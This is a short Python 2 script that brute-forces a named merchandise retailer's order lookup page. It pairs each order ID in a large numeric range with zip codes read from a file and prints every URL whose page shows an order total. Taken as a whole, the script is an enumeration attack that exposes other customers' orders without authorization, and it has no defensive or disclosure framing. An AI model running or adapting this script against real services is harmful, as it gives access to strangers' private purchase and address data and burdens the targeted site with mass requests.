from bs4 import BeautifulSoup
import urllib2
input_file = open('zipcodes.txt', 'r')
line_count = 0
current_order = 0
stringOrder = ''
for line in input_file:
    for current_order in range (3071325, 4000000):
        stringOrder = `current_order`
        # keep 'line' there to go through every zipcode in america or just specify what zipcode you want
        # i don't recommend keeping line there unless you have a few years
        url = "http://merchnow.com/orders/LookupById?orderId=" + stringOrder + "&postalCode=" + line
        page=urllib2.urlopen(url)
        soup = BeautifulSoup(page.read(), "html.parser")
        pageText = soup.get_text()
        if "Order Total" in pageText:
            print url
